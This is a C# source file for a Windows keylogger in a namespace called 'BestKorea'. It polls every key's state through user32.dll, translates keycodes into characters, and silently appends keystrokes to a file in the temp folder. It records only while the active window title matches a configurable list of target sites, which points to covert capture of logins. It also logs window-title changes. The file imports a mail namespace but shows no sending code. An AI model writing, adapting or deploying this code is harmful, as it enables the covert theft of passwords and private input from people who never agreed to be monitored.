using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
//using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;
using System.Net.Mail;
using System.Net;
using System.Text.RegularExpressions;

namespace BestKorea
{
    class Keylogger
    {
        [DllImport("User32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern short GetKeyState(int nVirtKey);

        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private static string CurrentWindowTitle = GetActiveWindowTitle();
        public static string path = Path.GetTempPath() + 1234567890 + ".txt";
        public const string alphabets = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
        public static bool thread_continue = true;
        public static Mutex mut = new Mutex();

        public static void Start()
        {
            Thread thread_Logger = new Thread(Keylog);
            Thread thread_windowTitle = new Thread(WindowTitle);
            thread_windowTitle.Start();
            thread_Logger.Start();
        }
        public static void Stop()
        {
            thread_continue = false;
        }
        static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            StringBuilder Buff = new StringBuilder(nChars);
            IntPtr handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return "None";
        }

        static void Keylog()
        {
            while (thread_continue == true)
            {
                Thread.Sleep(10);
                // im so sorry
                foreach (var x in Properties.Settings.Default.Sites)
                {
                    if (Regex.IsMatch(GetActiveWindowTitle(), x, RegexOptions.IgnoreCase))
                    {
                        string[] numbers = { "D1", "D2", "D3", "D4", "D5", "D6", "D7", "D8", "D9", "D0" };

                        for (int i = 0; i < 255; i++)
                        {
                            int keyState = GetAsyncKeyState(i);
                            if (keyState == 1 || keyState == -32767)
                            {

                                bool CapsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
                                bool shift = Control.ModifierKeys == Keys.Shift;
                                string toStringText = Convert.ToString((Keys)i);
                                if (numbers.Contains(toStringText) && !shift)
                                {
                                    string number = Convert.ToString(toStringText.ToArray()[1]);
                                    toStringText = number;
                                }
                                if (alphabets.Contains(toStringText))
                                {
                                    if (!CapsLock && !(shift))
                                    {
                                        toStringText = toStringText.ToLower();
                                    }
                                }
                                else if (numbers.Contains(toStringText))
                                {
                                    if (shift)
                                    {
                                        switch (toStringText)
                                        {
                                            case "D1": { toStringText = "!"; break; }
                                            case "D2": { toStringText = "@"; break; }
                                            case "D3": { toStringText = "#"; break; }
                                            case "D4": { toStringText = "$"; break; }
                                            case "D5": { toStringText = "%"; break; }
                                            case "D6": { toStringText = "^"; break; }
                                            case "D7": { toStringText = "&"; break; }
                                            case "D8": { toStringText = "*"; break; }
                                            case "D9": { toStringText = "("; break; }
                                            case "D0": { toStringText = ")"; break; }
                                            default: { break; }
                                        }
                                    }
                                }
                                else if (toStringText.Contains("Oem") || string.Compare(toStringText, "Space") == 0)
                                {
                                    switch (toStringText)
                                    {
                                        case "Oemtilde": { toStringText = shift ? "~" : "`"; break; }
                                        case "OemMinus": { toStringText = shift ? "_" : "-"; break; }
                                        case "Oemplus": { toStringText = shift ? "+" : "="; break; }
                                        case "OemOpenBrackets": { toStringText = shift ? "{" : "["; break; }
                                        case "Oem6": { toStringText = shift ? "}" : "]"; break; }
                                        case "Oem5": { toStringText = shift ? "|" : "\\"; break; }
                                        case "Oem1": { toStringText = shift ? ":" : ";"; break; }
                                        case "Oem7": { toStringText = shift ? "\"" : "'"; break; }
                                        case "Oemcomma": { toStringText = shift ? "<" : ","; break; }
                                        case "OemPeriod": { toStringText = shift ? ">" : "."; break; }
                                        case "OemQuestion": { toStringText = shift ? "?" : "/"; break; }
                                        case "Space": { toStringText = " "; break; }
                                        default: { break; }
                                    }
                                }
                                else if (string.Compare(toStringText, "ShiftKey") == 0 || string.Compare(toStringText, "RShiftKey") == 0 || string.Compare(toStringText, "LShiftKey") == 0)
                                {
                                    toStringText = "";
                                }
                                else
                                {
                                    toStringText = Environment.NewLine + toStringText + Environment.NewLine;
                                }

                                Console.Write(toStringText);
                                mut.WaitOne();
                                File.AppendAllText(path, toStringText);
                                mut.ReleaseMutex();
                                if (!Properties.Settings.Default.LogFile)
                                {
                                    Properties.Settings.Default.LogFile = true;
                                    Properties.Settings.Default.Save();
                                }
                                break;
                            }
                        }
                    }
                }
            }
        }


        static void WindowTitle()
        {
            while (thread_continue == true)
            {
                Thread.Sleep(10);
                string ActiveWindowTitle = GetActiveWindowTitle();
                foreach (var x in Properties.Settings.Default.Sites)
                {
                    if (CurrentWindowTitle != ActiveWindowTitle && Regex.IsMatch(GetActiveWindowTitle(), x, RegexOptions.IgnoreCase))
                    {
                        CurrentWindowTitle = ActiveWindowTitle;
                        mut.WaitOne();
                        File.AppendAllText(path, String.Format("{1}--------{0}--------", CurrentWindowTitle, Environment.NewLine));
                        mut.ReleaseMutex();
                    }
                }
            }
        }
    }
}

